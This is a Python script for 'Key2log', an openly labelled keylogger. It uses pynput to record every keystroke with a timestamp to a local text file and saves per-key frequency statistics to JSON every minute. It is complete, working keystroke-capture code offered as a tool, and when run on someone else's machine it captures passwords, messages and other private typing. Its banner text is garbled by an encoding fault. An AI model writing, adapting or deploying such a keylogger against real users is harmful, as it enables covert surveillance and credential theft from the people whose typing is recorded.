from pynput import keyboard
from datetime import datetime
import json
import os
import sys
import logging
from threading import Timer

# Credit information
__author__ = "Sanjeet Kalyan"
__tool_name__ = "Key2log"

def display_banner():
    banner = f"""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘             {__tool_name__}                   â•‘
    â•‘     Advanced Keylogger Tool          â•‘
    â•‘     Created by: {__author__}       â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """
    print(banner)

class AdvancedKeylogger:
    def __init__(self, log_file="keyboard_log.txt", stats_file="keystroke_stats.json"):
        self.log_file = log_file
        self.stats_file = stats_file
        self.key_count = 0
        self.start_time = datetime.now()
        self.special_keys = {}
        self.char_keys = {}
        
        # Set up logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('keylogger_debug.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        # Create necessary files
        self._initialize_files()
        
        # Start statistics timer
        self._start_stats_timer()

    def _initialize_files(self):
        """Initialize log files with headers"""
        try:
            if not os.path.exists(self.log_file):
                with open(self.log_file, 'w') as f:
                    f.write(f"=== {__tool_name__} Activity Log ===\n")
                    f.write(f"Created by: {__author__}\n")
                    f.write("=" * 40 + "\n")
                    
            if not os.path.exists(self.stats_file):
                self._save_stats()
        except Exception as e:
            logging.error(f"Error initializing files: {str(e)}")

    def _save_stats(self):
        """Save keystroke statistics to JSON file"""
        stats = {
            'tool_name': __tool_name__,
            'author': __author__,
            'total_keystrokes': self.key_count,
            'runtime': str(datetime.now() - self.start_time),
            'special_keys_frequency': self.special_keys,
            'character_frequency': self.char_keys
        }
        
        try:
            with open(self.stats_file, 'w') as f:
                json.dump(stats, f, indent=4)
        except Exception as e:
            logging.error(f"Error saving statistics: {str(e)}")

    def _update_stats(self, key_char, is_special=False):
        """Update keystroke statistics"""
        self.key_count += 1
        
        if is_special:
            self.special_keys[key_char] = self.special_keys.get(key_char, 0) + 1
        else:
            self.char_keys[key_char] = self.char_keys.get(key_char, 0) + 1

    def _start_stats_timer(self):
        """Start timer to periodically save statistics"""
        self._save_stats()
        Timer(60.0, self._start_stats_timer).start()

    def on_press(self, key):
        """Handle key press events"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
            
            try:
                key_char = key.char
                is_special = False
            except AttributeError:
                key_char = str(key)
                is_special = True
            
            self._update_stats(key_char, is_special)
            
            log_entry = f"{timestamp}: {key_char}\n"
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
                
        except Exception as e:
            logging.error(f"Error processing keystroke: {str(e)}")

    def start(self):
        """Start the keylogger"""
        try:
            display_banner()
            logging.info(f"{__tool_name__} started - Recording keystrokes...")
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as e:
            logging.error(f"Error starting keylogger: {str(e)}")

if __name__ == "__main__":
    try:
        keylogger = AdvancedKeylogger()
        keylogger.start()
    except KeyboardInterrupt:
        logging.info(f"{__tool_name__} stopped by user")
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
